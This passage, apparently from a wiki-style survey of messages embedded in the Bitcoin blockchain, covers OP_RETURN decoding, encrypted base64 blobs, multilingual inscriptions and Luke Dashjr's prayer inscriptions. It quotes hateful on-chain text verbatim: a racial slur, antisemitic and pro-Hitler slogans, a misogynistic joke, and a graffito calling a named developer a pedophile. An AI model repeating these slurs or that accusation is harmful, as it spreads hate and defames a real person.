> EW May our friendship endure, signed by hg, kty, wjj, and xyz.

no doubt initials of 4 [Chinese](china.md)people. A [blood brother](china.md#blood-brother) oath comes to mind, akin to the [Oath of the Peach Garden](china.md#oath-of-the-peach-garden). Will these four be the ones to take down the evil dictator [Xi Jinping](china.md#xi-jinping)?

<a id="_1215"></a>
The very first message gives away the name of what we assume is a web-based upload system, "EW" being its [advertisement](social-technology.md#advertisement) signature added to every message.

<a id="_1216"></a>
Running [`bitcoin-cli`](cryptocurrency.md#bitcoin-cli-client):<a id="_1217"></a>

```
bitcoin-core.cli getrawtransaction a3b3af21514bd79a4cbcac9916a8514636a72d813539192214542fd85247082e true
```
shows that the messages are encoded with [OP\_RETURN](cryptocurrency.md#op-return):<a id="_1218"></a>

```
  "vout": [
    {
      "value": 0.00000000,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_RETURN 455720457465726e6974792077616c6c206973206c697665
```

#### Quotes and threes

↑ **Parent:** [Text](#text)

<a id="_1220"></a>
Starting [tx 2f201c8518c7b012c03c2c82e40e86f6aaf616ea5fbe22570aac9d2c6611cb68](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0784.txt#L10962) ([2023-03-11](https://www.blockchain.com/explorer/transactions/btc/2f201c8518c7b012c03c2c82e40e86f6aaf616ea5fbe22570aac9d2c6611cb68)), the chain is flooded with ASCII transactions containing many repeated [double quotes](linguistics.md#double-quotes) `"` and digits `3`, with some other characters interspersed in them without any clear pattern e.g. the first one:<a id="_1221"></a>


> """"""""""""""""""""""""""""""""jk""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""'}""""""""""""""""""""""""""""""""/D""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""q1""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""XK""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

TODO what is up with that?

<a id="_1222"></a>
In that first trasaction the quotes appear as part of a [multisig](cryptocurrency.md#multisig) [output script](cryptocurrency.md#bitcoin-output-script).

### Encrypted data

↑ **Parent:** [Media type](#media-type)  
🏷️ **Tags:** [Encryption](cryptography.md#encryption)

<a id="_1224"></a>
Transactions such as [tx fe37c7eee73be5fda91068dbe0eb74a68495a3fc7185712b8417032db7fc9c5e](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/7e95546479508e9fe5158dad6bc8601e2b4e02ee/data/out/0339.txt#L74) ([2015-01-15](https://www.blockchain.com/explorer/transactions/btc/fe37c7eee73be5fda91068dbe0eb74a68495a3fc7185712b8417032db7fc9c5e)) starting with<a id="_1225"></a>

```
U2FsdGVkX1/4iSjLxQ5epo8eRSCOQLGgAsn1CucGii27k8ZyC7Jz6wxhYcevVmxi
6Q4ZFN04WDN0UhKqYardgQf26oeBMURupduDd0ZozxlgMrBkFOCaARqU7RABVWDO
/ruPUcOY0VC8p4lrMNqSdqvN7y6OWwOSH3c0duumZfFNZs9+BbtKCxtaqR5+RkUI
```
are [Base64](computer.md#base64) encoded. Running them through `base64 -d` leads to starting output bytes `Salted__` which as mentioned at [https://security.stackexchange.com/questions/124312/decrypting-binary-code-from-a-base64-string](https://security.stackexchange.com/questions/124312/decrypting-binary-code-from-a-base64-string) is [OpenSSL](https://ourbigbook.com/go/topic/openssl) encrypted data. So hwerever we see the start:<a id="_1226"></a>

```
U2FsdGVkX1/
```
we might as well give up. That string appears 26 times in our data currently, between [6c091e6152b83ec0df8d0d87c7c5f3da72a3328ed3a5d91768ba0ab899c16b9d](https://www.blockchain.com/explorer/transactions/btc/6c091e6152b83ec0df8d0d87c7c5f3da72a3328ed3a5d91768ba0ab899c16b9d) (2014-09-28) and [84189c82995db355e92e37f8cfe8a9274e9a5d157f1f1658067672e707469a09](https://www.blockchain.com/explorer/transactions/btc/84189c82995db355e92e37f8cfe8a9274e9a5d157f1f1658067672e707469a09) (2019-07-06)

<a id="_1227"></a>
The following via [cryptograffiti.info](#cryptograffiti-info) get marked by `file` as "openssl enc'd data with salted password, [Base64](computer.md#base64) encoded":<a id="_1228"></a>

<a id="_1229"></a>
- ad3d8a0a5d57114b1780341cb5104284f029bb01b1b3558f7c7b9ce51eb67e18
<a id="_1230"></a>
- 1cd0c631f444d664601468f644b70e0166019a54d8678de51310139b6c8b2bd7
<a id="_1231"></a>
- ccc3fb2c9cb1c640b76645a8658693066fd63433ab17c318691ad5bd62601c0e
<a id="_1232"></a>
- e6eb0cb8268a9b3d012d2957b32d4b28ccc3317593f54f4bfe4b387326588bd2
<a id="_1233"></a>
- c40e322b198b715accc4a67fad244ed131b8cef0785070e06d10d56c4ab389f2
<a id="_1234"></a>
- 37a261ac6dbf59e3c9673a22028bcdbdd08926a9d32134ab8fba0897f6dcd196
<a id="_1235"></a>
- f1aa516fe00ec2156f16fcb9da422f6cbcd141e8e58c895d8bc37b4ad2fd714e
<a id="_1236"></a>
- 7faf29c7dd7d9cc6d099c262f7ec7edd7fc768276482ad66ceefdd814f1d38ab
<a id="_1237"></a>
- 69cac244051661cc0b8b08905af5ab312a1282b68c932e5d1e3c46ad47ff0f7a
<a id="_1238"></a>
- 1773c39f844951b7169dc34aa0c72aa7b43cae6a103ed1223527ef0f4deec2a9
<a id="_1239"></a>
- b1d4bf3fc46e63c995ad4299f3576340077bc810dfa5c502d1c068460d54bc98
<a id="_1240"></a>
- a52625837741902e1dd24de3dbd3b948d6e0907ad3fc957c13cdf53fa2c3b9ac
<a id="_1241"></a>
- 4ca742813eaccef009e24e92150dda06540c2ac81782f1569b1ebb3179a413d2
<a id="_1242"></a>
- 6c3bab5fc6e6352c62a16ab0f47394845aa41a2c0b25e1a1073a4aeac150e03d
<a id="_1243"></a>
- 20b8feef3d293a0dd79e3c169fceb1217465502a523acbab903a7eb0cd183709
<a id="_1244"></a>
- b7863215b99567bc9e71155b13f3c5f26d15eac52493ee2e834129460ffd2aec
<a id="_1245"></a>
- 2c8961a64bb11d5855790085f51007273467f7ef862137215c9f1d958dcb6c57
<a id="_1246"></a>
- bed542957bdd8f644a4fcd671a8c66a5cc5d6168f9fa60d37177703e77558eee
<a id="_1247"></a>
- 3e45af9d828754d5a38c86636a070610f6e828482718c4a597d272d41a3e31fa
<a id="_1248"></a>
- a13af4817e85cacce3cfb445001e2fb2f56cdc30f78348fd2580bf8f4c84dc55
<a id="_1249"></a>
- 87a10f6bc65a08067b2544e46be00d4af62c0cfed3ae0b165d5eedaff09d81da
<a id="_1250"></a>
- ef55826befabbe9dcd44d87fc385d600dd4c4cba3346cde53d8c591960e9b4dc
<a id="_1251"></a>
- 5d30f63131dcf2b4d001b4ab530e18cc6ff8ffd16cade055ff4587a59b84e420
<a id="_1252"></a>
- 8a75514829b6e30b9fea434eef77b1589ff3f4bdfc0056bd087efbfb8314eb59
<a id="_1253"></a>
- e2be1062c9d43cc6ed43de6f7a40c728d2d92ed0325abde24ff3300cf3ae136a
<a id="_1254"></a>
- 8fe5c2679237e36c74fda04bb083f732c4afdd06af81121b1d7b4d5bd677135f
<a id="_1255"></a>
- 7f099f094d8d51105d8655253d45ebddf1c88b9e138c302a65d2878a237e620c
<a id="_1256"></a>
- 0fc4b3a305e2a7faa2e7d9c2f23d23d626e9e75f1f2a37133f283334b314645b
<a id="_1257"></a>
- 933b321e7b7144ed5e4e1750f944be9ed10293633d9b288bf05febdeb9dc40a3
<a id="_1258"></a>
- 6215486bc024dea7991b142e50e111c4063e1db4a867514612b8e794b8ef5635
<a id="_1259"></a>
- fc0613e11269962d97373b10e310f451fb76c7bb477ba1afb45773c44851e9ed
<a id="_1260"></a>
- ab51d2c037b4625394c68706da83c26bad751018d2a3e377a51988bd8ee18647
<a id="_1261"></a>
- 7ca9b337172f4feff67a0ecbfbd76798265e08c6ebe989a319883c695d756247
<a id="_1262"></a>
- 0f0b477e456dcf286d7262497bcd5b3b6a3ce89f81761c2f59ff702539ab6183
<a id="_1263"></a>
- a320152fd59426c8853dd781db9d682f89755953b39a653f9e9c9628a5fce7fb
<a id="_1264"></a>
- e96221da774fb52d24dda1b83b14c99085eb4befac64691722c56eb750562d68
<a id="_1265"></a>
- a7a5ca68dd340dd42bd5c91e0febe68e5fd2fb993da2992661183eaafe8ad89e
<a id="_1266"></a>
- 64e9d95e2333cfd155506199c8d926649e63a98dbc83c1221b8dd1580937b942

<a id="_1267"></a>
[https://blockchain.news/news/mysterious-bitcoin-inscriptions-a-puzzle-in-raw-binary-data](https://blockchain.news/news/mysterious-bitcoin-inscriptions-a-puzzle-in-raw-binary-data) mentions a huge 9 MB [Ordinal ruleset inscription](#ordinal-ruleset-inscription) that no-one managed to decode, and so people suspect is encrypted data. Seems to be split across transactions, starting at fed7de7fb75a3fe3c1acbbd8e19a4c540fb368474c8834e4ddb1d5bab764a767

## Themes

↑ **Parent:** [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)

<a id="_1268"></a>
In this section we document events that led to a large number of thematically related messages being added to the chain e.g. referencing some current event that happened, as opposed to the media encoding/type like [images](#images) and [text](#text) sections.

<a id="_1269"></a>
The "[Hitler](continent.md#adolf-hitler) did nothing wrong" [meme](science.md#meme)[https://knowyourmeme.com/memes/hitler-did-nothing-wrong](https://knowyourmeme.com/memes/hitler-did-nothing-wrong) is repeated several times, e.g.: [tx 41967a7d75e9e1ca8c142a45ce29ea08b451a3b55c3e33538f5cc8a389ec66ab](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0366.txt#L660) ([2015-07-20](https://www.blockchain.com/explorer/transactions/btc/41967a7d75e9e1ca8c142a45ce29ea08b451a3b55c3e33538f5cc8a389ec66ab)):<a id="_1270"></a>


> EW Hitler did nothing wrong.

This one is also an [Eternity Wall](#eternity-wall) message. The message had also been previously [Base58 encoded](#base58-messages) at [address 1HitLerDidNothingWrongggggghJewfv](https://www.blockchain.com/explorer/addresses/btc/1HitLerDidNothingWrongggggghJewfv) in two different instances:<a id="_1271"></a>

<a id="_1272"></a>
- [tx 55654178fe601c1fbe8b52b544286962523f11ec60ef12c94bc55198bb8c405c](https://www.blockchain.com/explorer/transactions/btc/55654178fe601c1fbe8b52b544286962523f11ec60ef12c94bc55198bb8c405c) block 216909 (2013-01-17). That one is also followed by some other niceties:<a id="_1273"></a>

  <a id="_1274"></a>
  - [`1NiggersNiggersNiggersNiggerwxhs77`](https://www.blockchain.com/explorer/addresses/btc/1NiggersNiggersNiggersNiggerwxhs77): 4x "Niggers"
  <a id="_1275"></a>
  - [`1JewsDidTheEconomyXXXXXXXXXXbd7ZkE`](https://www.blockchain.com/explorer/addresses/btc/1JewsDidTheEconomyXXXXXXXXXXbd7ZkE): "Jews Did the Economy"
<a id="_1276"></a>
- [tx daa7fa928b8079174a646a9456ce9dad14eac44beb2fe5a2cb1c35ce70e92916](https://www.blockchain.com/explorer/transactions/btc/daa7fa928b8079174a646a9456ce9dad14eac44beb2fe5a2cb1c35ce70e92916) block 310007 (2014-07-10)

<a id="_1277"></a>
[Brazil](brazil.md):<a id="_1278"></a>

<a id="_1279"></a>
- tx 1c05bb7c0a8c9498d33a1e6d4a91bbb4c651daa5ea5a21aa5c8c600d3300b8bb Viva Brazil's Impeachment!
<a id="_1280"></a>
- tx 105fb3a0be8ab50bfa36012e0319a752dee39702cb44f3904cf423eb20367d57 contains a [misogenous](brain.md#misogyny) joke:<a id="_1281"></a>
  > A mulher feia so tem uma coisa a oferecer,uma boa foda(Diego Silva de Oliveira)

  which translates to:<a id="_1282"></a>
  > Ugly women only have one thing to offer, a good [fuck](biology.md#sexual-intercourse)

  It is attributed to Diego Silva de Oliveira, possibly this [football](art.md#football) player: [https://en.wikipedia.org/wiki/Diego_Silva_(footballer,_born_1990)](https://en.wikipedia.org/wiki/Diego_Silva_(footballer,_born_1990))
<a id="_1283"></a>
- c72dc315a5504362d01f2dcdfe77826d14a9eb3411b83edd7aa782e95e4a7794 via [cryptograffiti.info](#cryptograffiti-info):<a id="_1284"></a>

  ```
  NÓS DISSEMOS SIM
  AGÊNCIA TRANSITIVA 2015

  Nota pública de reconhecimento do Acordo Reconformado, assinado pela Agência Transitiva e
  pela Escola de Artes Visuais do Parque Lage, em 22 de Abril de 2015.

  #ENCRUZILHADA
  EAV PARQUE LAGE
  22.04.2015
  ```
<a id="_1285"></a>
- 1c05bb7c0a8c9498d33a1e6d4a91bbb4c651daa5ea5a21aa5c8c600d3300b8bb via [cryptograffiti.info](#cryptograffiti-info):<a id="_1286"></a>
  > Viva Brazil's Impeachment!

<a id="_1287"></a>
Our indexer does not handle [UTF-8](telecommunication.md#utf-8), here's a collection of some UTF-8 messages we've stumbled upon somewhat randomly:

<a id="_1288"></a>
Arabic:<a id="_1289"></a>

<a id="_1290"></a>
- <a id="_1291"></a>
  7eb561f2139761064de20033fa4843f1f3e1a9551268704b36f84d94e66fd91a<a id="_1292"></a>


  > يا سلم!  
  > شعرك جميل  
  > و عينيك حلوة  
  > انا عطشان  
  > اِروني من عينيك

  <a id="_1293"></a>
  > O peace!  
  > Your hair is beautiful  
  > And your eyes are beautiful  
  > I'm thirsty  
  > Show me from your eyes
<a id="_1294"></a>
- b7376cae03b88392e5fd0292bcb43105386fbb534fc9be68c1e3d0b8f39e5ba4 via [cryptograffiti.info](#cryptograffiti-info)<a id="_1295"></a>
  > sjalom, salaam, peace!  
  > الدين
<a id="_1296"></a>
- <a id="_1297"></a>
  7a898b7e6b2145f4f887e1ff890d0b613e3008fbe350aa92662735e3acd0c0bc<a id="_1298"></a>


  > هذه رسالة من المستقبل  
  > إلى الماضي ...  
  > الحياة صعبة في المستقبل  
  > رعاية العالم  
  > وتحمل المسؤولية  
  > /y

  <a id="_1299"></a>
  > This is a message from the future  
  > To the past...  
  > Life is difficult in the future  
  > Caring for the world  
  > And take responsibility  
  > /y

<a id="_1300"></a>
Russian:<a id="_1301"></a>

<a id="_1302"></a>
- <a id="_1303"></a>
  1dcd62c922eb1ddbc1f58615b6271d64736bf55e83408cef02a7d0ac6707e423 via [cryptograffiti.info](#cryptograffiti-info)<a id="_1304"></a>


  > А на Земле Быть Добру!

  <a id="_1305"></a>
  > And on Earth To Be Good!
<a id="_1306"></a>
- <a id="_1307"></a>
  596cc6e905a5fc8248cf59198a19ce5070228b302a9f3a993197e2c87ddcaf14 via [cryptograffiti.info](#cryptograffiti-info)<a id="_1308"></a>


  > Книга Вечно Живущих открыта

  <a id="_1309"></a>
  > The Book of the Ever-Living is open
<a id="_1310"></a>
- <a id="_1311"></a>
  596cc6e905a5fc8248cf59198a19ce5070228b302a9f3a993197e2c87ddcaf14 via [cryptograffiti.info](#cryptograffiti-info)<a id="_1312"></a>


  > Это тест, сука блять.

  <a id="_1313"></a>
  > This is a test, motherfucker.
<a id="_1314"></a>
- <a id="_1315"></a>
  ed56ef68ccbfb1d47bc159fb62fab6807ee4d7363d0ad4cded2e922a5b47362e via [cryptograffiti.info](#cryptograffiti-info)<a id="_1316"></a>


  > Путин хуйло лалалалалалалалалал

  <a id="_1317"></a>
  > Putin sucks lalalalalalalalala

<a id="_1318"></a>
Chinese:<a id="_1319"></a>

<a id="_1320"></a>
- <a id="_1321"></a>
  12b32b6752fbf521243c63dfb5e3fda46523dd7b572143635458f743591d3e35 via [cryptograffiti.info](#cryptograffiti-info):<a id="_1322"></a>


  > 中文測試

  <a id="_1323"></a>
  > Chinese test
<a id="_1324"></a>
- a3dbd6cbb8637b6bf91d22ea97db2843d995498fd62740b9ed1e9dc068f2ad2d via [cryptograffiti.info](#cryptograffiti-info)<a id="_1325"></a>

  <a id="_1326"></a>
  - <a id="_1327"></a>
    > R.I.P aaarobbie（書玄）
<a id="_1328"></a>
- [Ordinal ruleset inscription](#ordinal-ruleset-inscription)<a id="_1329"></a>

  <a id="_1330"></a>
  - [tx 8e89ce6bef85aea795f41f97a4dcd550d8cbc6d1f606f37109f6dc8b31f91bc1](https://ordinals.com/inscription/8e89ce6bef85aea795f41f97a4dcd550d8cbc6d1f606f37109f6dc8b31f91bc1i0): [Diamond Sutra](religion.md#diamond-sutra) in Chinese. Again at tx 0bc660cc2c6d0ec4f7dfe61bfb3a592b4a65677b16da7db35729fd43eee5323e.
  <a id="_1331"></a>
  - [tx 7b0a0b9f18a729e905822304f9c4c05f8851d10bdc82efa902fd936ef874efeb](https://ordinals.com/inscription/7b0a0b9f18a729e905822304f9c4c05f8851d10bdc82efa902fd936ef874efebi0): the first few poems from [Three Hundred Tang Poems](china.md#three-hundred-tang-poems), a collection of famous Chinese poems from the [Tang dynasty](china.md#tang-dynasty) compiled in 1763. Each poem uses a [classical Chinese poetry form](china.md#classical-chinese-poetry-form) with a small number of verses, usually 4, and fits into one line. Most lines contain the poem title, dynasty, author name followed by the poem, e.g. the first line:<a id="_1332"></a>
    > 《春晓》唐 文嘉 春眠不觉晓，处处闻啼鸟。 夜来风雨声，花落知多少。

    is amazingly translated by [Google Translate](google.md#google-translate) as:<a id="_1333"></a>
    > "Spring Dawn" by Wenjia of the Tang Dynasty: When I sleep in spring, I don't realize the dawn, and I hear the singing of birds everywhere. The night comes wind and rain, Whispering Colour.

<a id="_1334"></a>
Japanese:<a id="_1335"></a>

<a id="_1336"></a>
- <a id="_1337"></a>
  ac2ad7c15162a8e461387b0d0d681bb5f81f2db1138b8f200b81bbc585bd0b8f via [cryptograffiti.info](#cryptograffiti-info):<a id="_1338"></a>


  > モキーのフラッシュバン許すな

  <a id="_1339"></a>
  > Don't forgive Moky's flashbang

<a id="_1340"></a>
Hebrew:<a id="_1341"></a>

<a id="_1342"></a>
- <a id="_1343"></a>
  0b32736592ce7abdd4d971bc4591544e1610ff51f498c9a14a6ba34a3abcad5d via [cryptograffiti.info](#cryptograffiti-info)<a id="_1344"></a>


  > חתימה טובה לכולם בכלל ולחברי ביטקוין ישראלי בפרט.

  <a id="_1345"></a>
  > A good signature for everyone in general and Israeli Bitcoin members in particular.
<a id="_1346"></a>
- d7b80c8fefc88cc3f06d74f8496e2dc6f44b5f5f0a59f9ba1ba27266848a8666 via [cryptograffiti.info](#cryptograffiti-info) contains what appears to be [UTF-8](telecommunication.md#utf-8) Hebrew text on my terminal, but [Google Translate](google.md#google-translate) couldn't translate it, so we are unsure.

### Prayer wars

↑ **Parent:** [Themes](#themes)  
🏷️ **Tags:** [Cute Coinbase messages](#cute-coinbase-messages)

<a id="_1349"></a>
Starting at [tx cbbaa0a64924fe1d6ace3352f23242aa0028d4e0ff6ae8ed615244d66079cfb1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0139.txt#L1) ([2011-08-05](https://www.blockchain.com/explorer/transactions/btc/cbbaa0a64924fe1d6ace3352f23242aa0028d4e0ff6ae8ed615244d66079cfb1)), [Catholic](religion.md#catholic-church) [Bitcoin developer](cryptocurrency.md#bitcoin-developer) [Luke Dashjr](cryptocurrency.md#luke-dashjr) started to [inscribe](social-technology.md#inscription-blockchain) prayers in the [miner messages](social-technology.md#miner-message) of his [mining pool](cryptocurrency.md#mining-pool) "[Eligius pool](cryptocurrency.md#eligius-pool)", usually one verse per message.

<a id="image-saint-eligius-by-petrus-christus"></a>
![](https://upload.wikimedia.org/wikipedia/commons/1/11/Petrus_Christus_003.jpg)

**[Figure 98](#image-saint-eligius-by-petrus-christus). Saint Eligius by Petrus Christus**. [Source](https://commons.wikimedia.org/wiki/File:Petrus_Christus_003.jpg). Off-chain image for illustration. [Eligius pool](cryptocurrency.md#eligius-pool) is named after [Saint Eligius](religion.md#saint-eligius), patron of goldsmiths and miners[https://twitter.com/LukeDashjr/status/1749183638313246875](https://twitter.com/LukeDashjr/status/1749183638313246875)

<a id="_1350"></a>
These are some of the earliest inscriptions in the blockchain, and therefore extremelly visible.

<a id="_1351"></a>
Although the prayer verses appear contiguous in ASCII dumps, Eligius was not actually mining every block: it is just that in those early days, miners still hadn't started adding advertisement messages to every block, so only Eligius shows up and appears contiguous.

<a id="_1352"></a>
At some point, opponents noticed these messages, and started adding atheist mockery graffiti replies, which appear interspersed in ASCII dumps with the prayer.

<a id="_1353"></a>
The first prayer is  the [Latin](linguistics.md#latin) version of the [Divine Praises](religion.md#divine-praises), a [Catholic](religion.md#catholic-church) prayer composed in 1797 in [Italian](continent.md#italy) by Luigi Felici for the purpose of making reparation after saying or hearing sacrilege or blasphemy. Luke claims he was referring to anything in particular that came prior in the blockchain: [https://twitter.com/LukeDashjr/status/1749182637569122434](https://twitter.com/LukeDashjr/status/1749182637569122434). There arent many earlier inscriptions at all to refer to in any case! The prayer and correspondong interrupts (in transaction outputs, not by other miners) ordered by block are:

<a id="_1354"></a>
<a id="_1355"></a>
- [139690](https://www.blockchain.com/explorer/blocks/btc/139690) (2011-08-05) prayer: "Eligius/Benedictus Deus. Benedictum Nomen Sanctum eius."
<a id="_1356"></a>
- [139717](https://www.blockchain.com/explorer/blocks/btc/139717) prayer: "Eligius/Benedictus Deus. Benedictum Nomen Sanctum eius.'
<a id="_1357"></a>
- [139758](https://www.blockchain.com/explorer/blocks/btc/139758) interruption: `***************************************************`. This is not a [Coinbase message](cryptocurrency.md#coinbase-message): [https://www.blockchain.com/explorer/transactions/btc/23befff6eea3dded0e34574af65c266c9398e7d7d9d07022bf1cd526c5cdbc94](https://www.blockchain.com/explorer/transactions/btc/23befff6eea3dded0e34574af65c266c9398e7d7d9d07022bf1cd526c5cdbc94). This [Bitcoin input script](cryptocurrency.md#bitcoin-input-script) appears to spend a standard [P2PKH](cryptocurrency.md#p2pkh) output, but it first adds an extra value to the stack which contains the `***`.
<a id="_1358"></a>
- [139792](https://www.blockchain.com/explorer/blocks/btc/139792) prayer: "Benedictus Iesus Christus, verus Deus et verus homo.'
<a id="_1359"></a>
- [139831](https://www.blockchain.com/explorer/blocks/btc/139831) prayer: "Benedictum Nomen Iesu.'
<a id="_1360"></a>
- [139838](https://www.blockchain.com/explorer/blocks/btc/139838) (2011-08-06) interruption: "I LIKE TURTLES" (tx 78eb16507b3d3df615e3b474e853db4667f4b11954ec6d918b1ded0fca7ad25a)
<a id="_1361"></a>
- [138898](https://www.blockchain.com/explorer/blocks/btc/138898) prayer: "Benedictum Cor eius sacratissimum."
<a id="_1362"></a>
- [139904](https://www.blockchain.com/explorer/blocks/btc/139904) prayer: "Benedictus Sanguis eius pretiosissimus."
<a id="_1363"></a>
- [139921](https://www.blockchain.com/explorer/blocks/btc/139921) prayer: "Benedictus Iesus in sanctissimo altaris Sacramento."
<a id="_1364"></a>
- [139942](https://www.blockchain.com/explorer/blocks/btc/139942) prayer: "Benedictus Sanctus Spiritus, Paraclitus."
<a id="_1365"></a>
- [139954](https://www.blockchain.com/explorer/blocks/btc/139954) interrupion: "aC-C-C-COMBO BREAKER" (tx 138c024a76df99ecafd2236d5429cf574b7778a3c6508bd83f116c832f3c6980)
<a id="_1366"></a>
- [139960](https://www.blockchain.com/explorer/blocks/btc/139960) prayer: "Benedictus Sanctus Spiritus, Paraclitus."
<a id="_1367"></a>
- [139977](https://www.blockchain.com/explorer/blocks/btc/139977) prayer: "Benedicta excelsa Mater Dei, Maria sanctissima."
<a id="_1368"></a>
- [139990](https://www.blockchain.com/explorer/blocks/btc/139990) (2011-08-06) prayer: "Benedicta sancta eius et immaculata Conceptio."

<a id="_1369"></a>
Then comes:<a id="_1370"></a>

<a id="_1371"></a>
- [140181](https://www.blockchain.com/explorer/blocks/btc/140181) [Latin](linguistics.md#latin) [Trinitarian formula](https://ourbigbook.com/go/topic/trinitarian-formula)<a id="_1372"></a>
  > In nomine Patris et Filii et Spiritus Sancti. Amen.
<a id="_1373"></a>
- [Act of Contrition](https://ourbigbook.com/go/topic/act-of-contrition)
<a id="_1374"></a>
- [Act of Hope](https://ourbigbook.com/go/topic/act-of-hope)
and various others + output message interruptions.

<a id="_1375"></a>
Then at last come the first [miner message](social-technology.md#miner-message) interruptions. Luke explained on Twitter[https://twitter.com/LukeDashjr/status/1749183094081335413](https://twitter.com/LukeDashjr/status/1749183094081335413) that they were also made by Eligius pool, as there was a system in which contributors besides Luke could submit their own strings:<a id="_1376"></a>

<a id="_1377"></a>
- [142547](https://www.blockchain.com/explorer/blocks/btc/142547): (2011-08-25) tx 8e1e44a48b5e79636675d1476f8e4add075bbeb7f49e00ec743eed56f17feaaa A yandere game is starting in 60 seconds! Please type "\]yandere" to join. [Yandere Simulator](https://ourbigbook.com/go/topic/yandere-simulator) comes to mind, but it can't be because that was pitched 2014.
<a id="_1378"></a>
- [142550](https://www.blockchain.com/explorer/blocks/btc/142550): "A yandere game is starting in 60 seconds! Please type "\]yandere" to join."
<a id="_1379"></a>
- [142573](https://www.blockchain.com/explorer/blocks/btc/142573): (2011-08-25) "Militant atheists, [http://bit.ly/naNhG2](http://bit.ly/naNhG2) -- happy now?". A [Rickrolling](#rickrolling) link. Perhaps one of the fist.
<a id="_1380"></a>
- [142596](https://www.blockchain.com/explorer/blocks/btc/142596): (2011-08-25) "\<cjdelisle\> ran out of prayers?! That explains the price drop.". Possibly quoting this dude on som [https://twitter.com/cjdelisle](https://twitter.com/cjdelisle) [Bitcoin IRC channel](cryptocurrency.md#bitcoin-irc-channel) givesn the `<USERNAME>` format?
<a id="_1381"></a>
- [142640](https://www.blockchain.com/explorer/blocks/btc/142640): "an de ti go su by ra me ni ko hu vy la po fy ton": [Tonal system](https://ourbigbook.com/go/topic/tonal-system) numerals. Interesting.
followed by more prayers and interruptions such as [tx ec92d245822fa1ff862f3314b9102f36fe1eb8bc055865674c75323540aedef6](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0142.txt#L10):<a id="_1382"></a>


> FFS [Luke-Jr](cryptocurrency.md#luke-dashjr) leave the blockchain alone!  
> Oh, and [God](religion.md#god) isn't real

<a id="_1383"></a>
The last Luke prayer appears to be on [block 143822](https://www.blockchain.com/explorer/blocks/btc/143822) (2011-09-03)<a id="_1384"></a>


> ... the Lord of the harvest, that he send forth labourers into his harvest.

<a id="_1385"></a>
Then there is a bit of [radio silence](https://ourbigbook.com/go/topic/radio-silence), until finally [Slush Pool](cryptocurrency.md#slush-pool) started self advertising for the first time on [block 163970](https://www.blockchain.com/explorer/blocks/btc/163970) (2012-01-26):<a id="_1386"></a>

```
/P2SH/BIP16/slush/R,
```
They had been mining for a long time by then (December 2010 according to [https://en.bitcoin.it/wiki/Slush_Pool](https://en.bitcoin.it/wiki/Slush_Pool)), but this is when they decided to add a human readable [ASCII](telecommunication.md#ascii) message as well.

<a id="_1387"></a>
From then on, [miner messages](social-technology.md#miner-message) would be forever polluted with ads, and Luke's multi-[miner message](social-technology.md#miner-message) feat would never again be reproduced.

<a id="_1388"></a>
The non-obvious interruptions are all well known [memes](science.md#meme)/anime references:<a id="_1389"></a>

<a id="_1390"></a>
- "I like turtles": [https://knowyourmeme.com/memes/i-like-turtles](https://knowyourmeme.com/memes/i-like-turtles)
<a id="_1391"></a>
- Combo breaker: [https://knowyourmeme.com/memes/combo-breaker](https://knowyourmeme.com/memes/combo-breaker)
<a id="_1392"></a>
- "Yukkuri Shiteitte ne": [https://knowyourmeme.com/memes/yukkuri-shiteitte-ne](https://knowyourmeme.com/memes/yukkuri-shiteitte-ne)
<a id="_1393"></a>
- "kLhLUKE-JR IS A [Pedophile](biology.md#pedophilia)! Oh, and [God](religion.md#god) isn't real, sucka. Stop polluting the blockchain with your nonsense.", [tx 9740e7d646f5278603c04706a366716e5e87212c57395e0d24761c0ae784b2c6](https://www.blockchain.com/explorer/transactions/btc/9740e7d646f5278603c04706a366716e5e87212c57395e0d24761c0ae784b2c6), [block 141460](https://www.blockchain.com/explorer/blocks/btc/141460)
<a id="_1394"></a>
- "Help me, ERINNNNNN!!": [https://touhou.fandom.com/wiki/Lyrics:_Help_me,_ERINNNNNN!!](https://touhou.fandom.com/wiki/Lyrics:_Help_me,_ERINNNNNN!!)
<a id="_1395"></a>
- "EASY MODO? How lame!F?": [https://knowyourmeme.com/memes/kimoi-girls](https://knowyourmeme.com/memes/kimoi-girls)

<a id="_1396"></a>
Bibliography:<a id="_1397"></a>

<a id="_1398"></a>
- 2011-08-19 [https://bitcointalk.org/index.php?topic=38007.0](https://bitcointalk.org/index.php?topic=38007.0) "Eligius miners aware of prayers in block headers?" from on [bitcointalk.org](cryptocurrency.md#bitcoin-forum) by user "Graet" who quotes prior discussion from a [Bitcoin IRC channel](cryptocurrency.md#bitcoin-irc-channel):<a id="_1399"></a>
  > <a id="_1400"></a>
  > \<luke-jr\> cosurgi: by design, it contains "random" data-- I've just been setting some of that "random" data to prayers
  > 
  > <a id="_1401"></a>
  > \<Graet\> mm interesting luke-jr i understand you are strong in your faith but you dont think putting prayers in might alienate some ppl - after all btc is multidenominational
  > 
  > <a id="_1402"></a>
  > \<luke-jr\> Graet: Catholics do not believe in freedom of religion.
  > 
  > <a id="_1403"></a>
  > \<Graet\> and you make your non catholic miners aware of this?
<a id="_1404"></a>
- 2011-11-02 [https://bitcointalk.org/index.php?topic=52979.0](https://bitcointalk.org/index.php?topic=52979.0) "Mysterious transaction spotted in blockchain!"

### Illegal content of block 229k

↑ **Parent:** [Themes](#themes)

<a id="_1406"></a>
These can be viewed at [https://bitcoinstrings.com/blk00052.txt](https://bitcoinstrings.com/blk00052.txt) and are mostly commented on the "Wikileaks cablegate data" section of [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014).

<a id="_1407"></a>
